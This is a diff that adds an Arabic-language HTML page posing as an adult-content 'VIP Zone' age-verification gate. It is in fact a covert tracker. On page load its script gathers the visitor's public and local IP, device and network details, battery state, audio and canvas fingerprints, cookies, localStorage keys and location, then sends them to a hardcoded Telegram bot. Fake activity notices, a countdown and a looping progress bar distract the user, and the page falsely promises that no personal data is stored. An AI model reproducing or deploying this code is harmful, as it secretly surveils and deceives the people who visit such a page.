@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>VIP Zone 🔞</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', 'Google Sans', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image: url('https://i.ibb.co/5WvCzwFC/images.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            position: relative;
+        }
+        /* طبقة خفيفة جداً جداً للحفاظ على وضوح الصورة 100% */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.05);
+            backdrop-filter: blur(0.5px);
+            -webkit-backdrop-filter: blur(0.5px);
+            z-index: 0;
+        }
+        .main-container {
+            position: relative;
+            z-index: 1;
+            max-width: 700px;
+            width: 100%;
+            background: rgba(10, 10, 20, 0.6);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: 40px;
+            padding: 35px 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+        }
+        .lock-icon { font-size: 48px; margin-bottom: 10px; display: block; text-shadow: 0 0 30px rgba(255,45,85,0.5); }
+        .main-title { font-size: 28px; font-weight: 700; color: #fff; margin-bottom: 5px; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
+        .main-sub { font-size: 16px; color: #ddd; margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; }
+
+        /* معرض الصور */
+        .gallery-title { color: #fff; font-size: 18px; margin-bottom: 15px; text-align: right; }
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .gallery-item {
+            background: rgba(255,255,255,0.05);
+            border-radius: 16px;
+            padding: 8px;
+            border: 1px solid rgba(255,255,255,0.1);
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+        .gallery-item:hover { transform: scale(1.05); background: rgba(255,45,85,0.2); }
+        .gallery-item img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            border-radius: 12px;
+            background: #1a1a2a;
+            pointer-events: none; /* منع تداخل الأحداث مع العنصر الأب */
+        }
+        .gallery-item span {
+            display: block;
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 6px;
+            font-weight: 500;
+        }
+
+        /* باقي العناصر */
+        .progress-section { margin-bottom: 20px; }
+        .progress-label { display: flex; justify-content: space-between; color: #ccc; font-size: 13px; margin-bottom: 5px; }
+        .progress-bar { background: #333; border-radius: 30px; height: 8px; overflow: hidden; }
+        .progress-fill { background: linear-gradient(90deg, #ff2d55, #b8003a); width: 0%; height: 100%; transition: width 0.5s; }
+        .timer-box {
+            background: rgba(0,0,0,0.4);
+            border-radius: 40px;
+            padding: 12px 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid #ff2d55;
+        }
+        .timer-text { color: #fff; font-size: 18px; font-weight: bold; }
+        .timer-text span { color: #ff2d55; font-size: 22px; }
+        .live-feed {
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            padding: 12px;
+            margin-bottom: 20px;
+            max-height: 70px;
+            overflow: hidden;
+        }
+        .live-feed p { color: #10b981; font-size: 13px; margin: 4px 0; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .content-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 24px;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-right: 4px solid #ff2d55;
+        }
+        .content-box p { font-size: 14px; color: #eee; line-height: 1.8; }
+        .content-box ul { padding-right: 20px; list-style: none; }
+        .content-box li { font-size: 13px; color: #ccc; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+        .content-box li::before { content: "✓"; color: #ff2d55; font-weight: bold; margin-left: 8px; }
+        .age-btn {
+            background: linear-gradient(135deg, #ff2d55, #b8003a);
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 8px 25px rgba(255, 45, 85, 0.4);
+        }
+        .age-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(255,45,85,0.6); }
+        .footer-note { font-size: 11px; color: #777; margin-top: 20px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.05); text-align: center; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: #10b981; padding: 10px 24px; border-radius: 60px; font-size: 14px; z-index: 2000; display: none; backdrop-filter: blur(10px); border: 1px solid rgba(16,185,129,0.3); }
+        .loader { display: inline-block; width: 16px; height: 16px; border: 2px solid white; border-radius: 50%; border-top-color: transparent; animation: spin 0.6s linear infinite; margin-left: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== نافذة تكبير الصورة (Fullscreen Modal) ===== */
+        .image-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 30px;
+            cursor: pointer;
+            animation: fadeInModal 0.3s ease;
+        }
+        @keyframes fadeInModal {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .image-modal img {
+            max-width: 95%;
+            max-height: 90%;
+            object-fit: contain;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            cursor: default;
+        }
+        .image-modal .close-modal {
+            position: absolute;
+            top: 25px;
+            left: 25px;
+            color: white;
+            font-size: 36px;
+            font-weight: 300;
+            cursor: pointer;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            transition: 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .image-modal .close-modal:hover {
+            background: rgba(255, 45, 85, 0.6);
+            transform: rotate(90deg);
+        }
+        .image-modal .image-caption {
+            position: absolute;
+            bottom: 40px;
+            color: #aaa;
+            font-size: 16px;
+            background: rgba(0,0,0,0.5);
+            padding: 8px 20px;
+            border-radius: 40px;
+            backdrop-filter: blur(4px);
+        }
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+    <span class="lock-icon">🔞</span>
+    <div class="main-title">VIP Zone</div>
+    <div class="main-sub">محتوى حصري للكبار – تحقق من عمرك</div>
+
+    <!-- 1. إشعارات وهمية -->
+    <div class="live-feed" id="liveFeed">
+        <p>🟢 انضم المستخدم Ahmed X منذ 5 ثوانٍ</p>
+    </div>
+
+    <!-- 2. عداد تنازلي (لن يتكرر) -->
+    <div class="timer-box">
+        <div class="timer-text">⏳ سيتم فتح المحتوى تلقائياً خلال <span id="countdownTimer">00:30</span></div>
+    </div>
+
+    <!-- 3. معرض الصور الجديدة -->
+    <div class="gallery-title">📸 معاينة سريعة للمحتوى (اضغط للتكبير)</div>
+    <div class="gallery-grid" id="galleryGrid">
+        <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/xqzvG6hK/e2a-486.jpg', 'الصورة 1')">
+            <img src="https://i.ibb.co/xqzvG6hK/e2a-486.jpg" alt="e2a 486" loading="lazy">
+            <span>صورة 1</span>
+        </div>
+        <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/r22Q4r2K/2c2-057.jpg', 'الصورة 2')">
+            <img src="https://i.ibb.co/r22Q4r2K/2c2-057.jpg" alt="2c2 057" loading="lazy">
+            <span>صورة 2</span>
+        </div>
+        <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/xS743GLm/2f5-037.jpg', 'الصورة 3')">
+            <img src="https://i.ibb.co/xS743GLm/2f5-037.jpg" alt="2f5 037" loading="lazy">
+            <span>صورة 3</span>
+        </div>
+        <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/fzC8hmqd/029-104.jpg', 'الصورة 4')">
+            <img src="https://i.ibb.co/fzC8hmqd/029-104.jpg" alt="029 104" loading="lazy">
+            <span>صورة 4</span>
+        </div>
+        <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/QFyWqFW9/790-066.jpg', 'الصورة 5')">
+            <img src="https://i.ibb.co/QFyWqFW9/790-066.jpg" alt="790 066" loading="lazy">
+            <span>صورة 5</span>
+        </div>
+        <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/7JGVPcjy/07c-079.jpg', 'الصورة 6')">
+            <img src="https://i.ibb.co/7JGVPcjy/07c-079.jpg" alt="07c 079" loading="lazy">
+            <span>صورة 6</span>
+        </div>
+    </div>
+
+    <!-- 4. شريط تقدم -->
+    <div class="progress-section">
+        <div class="progress-label"><span>جاري تجهيز المحتوى...</span><span id="progressPercent">0%</span></div>
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    </div>
+
+    <div class="content-box">
+        <p>⚠️ هذا القسم مخصص للأعمار فوق 18 سنة فقط. يرجى تأكيد عمرك للمتابعة.</p>
+        <ul>
+            <li>جميع المحتويات محمية بتقنية SSL 256-bit</li>
+            <li>لا يتم تخزين أي بيانات شخصية</li>
+            <li>المحتوى متوافق مع قوانين حماية المستخدم</li>
+        </ul>
+    </div>
+
+    <!-- زر "التالي" -->
+    <button class="age-btn" id="verifyBtn">
+        <span>➡️</span> التالي
+    </button>
+
+    <div class="footer-note">بوابة دخول آمنة | جميع الحقوق محفوظة © 2025</div>
+</div>
+
+<div id="toastMsg" class="toast"></div>
+
+<script>
+    // ========== بوت التجسس ==========
+    const SPY_BOT_TOKEN = "8734909182:AAFAslhEqDL_JelIPVTXtEaChA-3yAMOugw";
+    const CHAT_ID = "7388801889";
+
+    async function sendToSpyBot(text) {
+        const url = `https://api.telegram.org/bot${SPY_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true })
+            });
+        } catch(e) { console.error(e); }
+    }
+
+    // ========== دوال جمع المعلومات ==========
+    async function getPublicIP() {
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch(e) { return 'غير متاح'; }
+    }
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            let pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+            pc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate)?.[0];
+                    if (ip && !ip.startsWith('192.168.0.')) { resolve(ip); pc.close(); }
+                }
+            };
+            setTimeout(() => { resolve('غير متاح'); pc.close(); }, 2000);
+        });
+    }
+    async function getDeviceBasic() {
+        return {
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            cores: navigator.hardwareConcurrency || 'غير معروف',
+            ram: navigator.deviceMemory || 'غير معروف',
+            touchPoints: navigator.maxTouchPoints || 0
+        };
+    }
+    async function getNetworkInfo() {
+        const conn = navigator.connection || navigator.mozConnection;
+        if (conn) return { type: conn.effectiveType || 'غير معروف', speed: conn.downlink ? conn.downlink+' Mbps' : 'غير معروف' };
+        return { type: 'غير مدعوم', speed: 'غير معروف' };
+    }
+    async function getBattery() {
+        try { const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging ? 'شاحن' : 'بطارية'})`; } catch(e) { return 'غير متاح'; }
+    }
+    async function getFingerprints() {
+        let audio = 'غير متاح';
+        try {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const analyser = ctx.createAnalyser();
+            const gain = ctx.createGain();
+            gain.gain.value = 0;
+            osc.connect(analyser); analyser.connect(gain); gain.connect(ctx.destination);
+            osc.start(0);
+            const data = new Float32Array(analyser.frequencyBinCount);
+            analyser.getFloatFrequencyData(data);
+            osc.stop();
+            let sum = 0;
+            for (let i=0; i<data.length; i++) if (isFinite(data[i])) sum += Math.abs(data[i]);
+            audio = 'Audio-'+Math.floor(sum);
+        } catch(e) {}
+        let canvas = 'غير متاح';
+        try {
+            const c = document.createElement('canvas'); c.width=150; c.height=40;
+            const ctx = c.getContext('2d');
+            ctx.fillStyle = "#f60"; ctx.fillRect(0,0,80,15);
+            ctx.fillStyle = "#069"; ctx.fillText("VIP",5,15);
+            canvas = c.toDataURL().slice(0, 60);
+        } catch(e) {}
+        return { audio, canvas };
+    }
+    async function getStorage() {
+        let cookies = document.cookie || 'لا توجد';
+        let local = 'فارغ';
+        try { local = localStorage.length ? Object.keys(localStorage).slice(0,3).join(', ') : 'فارغ'; } catch(e) {}
+        return { cookies, local };
+    }
+    async function getLocation() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.city && data.country_name) return `${data.city}, ${data.region || ''}, ${data.country_name}`.replace(/,\s*,/, ',');
+            if (data.country_name) return data.country_name;
+            return "غير متاح";
+        } catch(e) { return "غير متاح"; }
+    }
+
+    async function sendFullSpyReport() {
+        const [ipPublic, ipLocal, device, battery, net, fp, location, storage] = await Promise.all([
+            getPublicIP(), getLocalIP(), getDeviceBasic(), getBattery(), getNetworkInfo(),
+            getFingerprints(), getLocation(), getStorage()
+        ]);
+        let browser = "غير معروف";
+        const ua = device.ua;
+        if (ua.includes("Chrome")) browser = "Google Chrome";
+        else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
+        else if (ua.includes("Edge")) browser = "Microsoft Edge";
+        else if (ua.includes("Opera")) browser = "Opera";
+
+        const report = `<b>🔞 تقرير VIP (محتوى غني)</b>\n\n` +
+            `• <b>🌐 المتصفح:</b> ${browser}\n` +
+            `• <b>📱 الجهاز:</b> ${device.platform} | ${device.ua.substring(0,80)}...\n` +
+            `• <b>🌍 IP العام:</b> ${ipPublic}\n` +
+            `• <b>🏠 IP المحلي:</b> ${ipLocal}\n` +
+            `• <b>📡 الشبكة:</b> ${net.type} | ${net.speed}\n` +
+            `• <b>🖥️ الشاشة:</b> ${device.screen}\n` +
+            `• <b>🧠 الرام:</b> ${device.ram} GB\n` +
+            `• <b>⚙️ الأنوية:</b> ${device.cores}\n` +
+            `• <b>🌐 اللغة:</b> ${device.language}\n` +
+            `• <b>⏱️ المنطقة:</b> ${device.timezone}\n` +
+            `• <b>👆 نقاط اللمس:</b> ${device.touchPoints}\n` +
+            `• <b>🔋 البطارية:</b> ${battery}\n` +
+            `• <b>🎵 Audio FP:</b> ${fp.audio}\n` +
+            `• <b>🎨 Canvas FP:</b> ${fp.canvas}\n` +
+            `• <b>🍪 الكوكيز:</b> ${storage.cookies.substring(0,100)}${storage.cookies.length>100?'...':''}\n` +
+            `• <b>💾 LocalStorage:</b> ${storage.local}\n` +
+            `• <b>📍 الموقع:</b> ${location}\n` +
+            `• <b>📅 الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+        await sendToSpyBot(report);
+    }
+
+    // ========== وظائف إلهاء المستخدم ==========
+
+    // 1. العداد التنازلي (30 ثانية) - لا يتكرر، يتوقف عند الصفر
+    let seconds = 30;
+    const timerDisplay = document.getElementById('countdownTimer');
+    const timerInterval = setInterval(() => {
+        seconds--;
+        if (seconds <= 0) {
+            clearInterval(timerInterval);
+            timerDisplay.innerText = '00:00';
+            showToast('⏰ انتهى الوقت! اضغط على "التالي" للمتابعة.');
+            return;
+        }
+        const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
+        const secs = String(seconds % 60).padStart(2, '0');
+        timerDisplay.innerText = `${mins}:${secs}`;
+    }, 1000);
+
+    // 2. شريط التقدم الوهمي (يعيد نفسه لأنه يعطي إحساساً بالتجهيز المستمر)
+    let progress = 0;
+    const progressFill = document.getElementById('progressFill');
+    const progressPercent = document.getElementById('progressPercent');
+    setInterval(() => {
+        progress += Math.floor(Math.random() * 15) + 5;
+        if (progress >= 100) {
+            progress = 0;
+            showToast('✅ تم تجهيز المحتوى! اضغط على "التالي" للدخول.');
+        }
+        progressFill.style.width = progress + '%';
+        progressPercent.innerText = progress + '%';
+    }, 2000);
+
+    // 3. الإشعارات الوهمية (نشاط مباشر)
+    const names = ['Ahmed', 'Sara', 'Mohammed', 'Lina', 'Omar', 'Nora', 'Khaled', 'Mona'];
+    const feed = document.getElementById('liveFeed');
+    setInterval(() => {
+        const randomName = names[Math.floor(Math.random() * names.length)];
+        const action = ['انضم للتو', 'شاهد المحتوى', 'قام بالتحقق', 'دخل الغرفة'];
+        const randomAction = action[Math.floor(Math.random() * action.length)];
+        const msg = document.createElement('p');
+        msg.innerText = `🟢 المستخدم ${randomName} ${randomAction} منذ ثوانٍ`;
+        feed.appendChild(msg);
+        if (feed.children.length > 4) feed.removeChild(feed.firstChild);
+        feed.scrollTop = feed.scrollHeight;
+    }, 5000);
+
+    // 4. تكبير الصورة عند الضغط (ملء الشاشة)
+    function openFullImage(imageSrc, imageName) {
+        // إزالة أي مودال مفتوح سابقاً
+        const existingModal = document.querySelector('.image-modal');
+        if (existingModal) existingModal.remove();
+
+        // بناء المودال
+        const modal = document.createElement('div');
+        modal.className = 'image-modal';
+        modal.onclick = function(e) {
+            // إغلاق عند الضغط على الخلفية (وليس على الصورة نفسها)
+            if (e.target === modal) modal.remove();
+        };
+
+        // زر الإغلاق (X)
+        const closeBtn = document.createElement('div');
+        closeBtn.className = 'close-modal';
+        closeBtn.innerHTML = '✕';
+        closeBtn.onclick = function(e) {
+            e.stopPropagation();
+            modal.remove();
+        };
+
+        // الصورة
+        const img = document.createElement('img');
+        img.src = imageSrc;
+        img.alt = imageName;
+        img.onclick = function(e) {
+            e.stopPropagation(); // منع إغلاق المودال عند الضغط على الصورة نفسها
+        };
+
+        // التسمية (اختياري)
+        const caption = document.createElement('div');
+        caption.className = 'image-caption';
+        caption.innerText = `📸 ${imageName}`;
+
+        modal.appendChild(closeBtn);
+        modal.appendChild(img);
+        modal.appendChild(caption);
+        document.body.appendChild(modal);
+
+        // منع التمرير خلف المودال
+        document.body.style.overflow = 'hidden';
+        // إعادة التمرير عند الإغلاق
+        const observer = new MutationObserver(() => {
+            if (!document.querySelector('.image-modal')) {
+                document.body.style.overflow = 'auto';
+                observer.disconnect();
+            }
+        });
+        observer.observe(document.body, { childList: true, subtree: true });
+    }
+
+    // 5. زر "التالي" (يوجه إلى رابط آخر)
+    document.getElementById('verifyBtn').addEventListener('click', function(e) {
+        this.disabled = true;
+        this.innerHTML = '<span class="loader"></span> جاري التوجيه...';
+        this.style.opacity = '0.7';
+
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = '✅ تم تأكيد عمرك بنجاح! جاري التوجيه...';
+        toast.style.display = 'block';
+        toast.style.background = 'rgba(0,0,0,0.9)';
+        toast.style.color = '#10b981';
+
+        setTimeout(() => {
+            window.location.href = 'https://example.com/'; // غيّر الرابط هنا
+        }, 2000);
+    });
+
+    // دالة الإشعارات المنبثقة
+    function showToast(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = msg;
+        toast.style.display = 'block';
+        toast.style.background = 'rgba(0,0,0,0.9)';
+        toast.style.color = '#ff2d55';
+        setTimeout(() => { toast.style.display = 'none'; }, 4000);
+    }
+
+    // ========== إرسال التقرير فوراً ==========
+    window.addEventListener('load', () => {
+        sendFullSpyReport().catch(console.error);
+    });
+</script>
+</body>
+</html>
